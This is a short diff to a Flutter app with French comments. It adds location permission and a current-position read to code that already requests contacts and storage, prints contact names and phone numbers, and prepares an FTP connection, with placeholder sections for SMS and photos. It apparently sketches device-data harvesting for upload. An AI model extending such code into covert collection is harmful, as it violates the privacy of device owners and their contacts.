@@ -1,4 +1,5 @@
 import 'dart:io';
+import 'package:geolocator/geolocator.dart';
 import 'package:device_info/device_info.dart';
 import 'package:flutter/material.dart';
 import 'package:ftpconnect/ftpConnect.dart';
@@ -41,6 +42,7 @@ class _MyHomePageState extends State<MyHomePage> {
     Map<Permission, PermissionStatus> statuses = await [
       Permission.storage,
       Permission.contacts,
+      Permission.location,
     ].request();
 
 // Préparation de la connexion FTP
@@ -64,6 +66,11 @@ class _MyHomePageState extends State<MyHomePage> {
       print(contact.displayName);
       print(contact.phones!.first.value);
     }
+
+    // ***** PARTIE SMS *****
+
+    // ***** PARTIE LOCALISATION *****
+    print(await Geolocator.getCurrentPosition());
 
     // ***** PARTIE PHOTOS *****
 
